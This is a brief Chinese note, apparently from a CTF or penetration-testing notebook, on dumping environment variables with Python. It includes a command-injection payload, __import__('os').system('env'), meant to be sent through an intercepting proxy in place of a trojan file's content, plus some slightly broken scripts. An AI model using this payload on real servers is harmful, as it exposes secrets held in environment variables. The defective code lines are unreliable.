打印环境变量的 python 

可以直接在bp输入，把自己木马文件那段删掉，输入这个，可得到环境变量

    __import__("os").system("env");

     import os;system("expert")

py脚本

    import os
    env_dist = os.environ
    for key in env_dist:
        print(key + ' : ' + env_dist[key])


    import os
    env_vars = os.environ //读取所有环境变量
    for var, value in env_vars.items():      //打印每个环境变量的名称和值
        print(f'{var}: {value}')

    import os
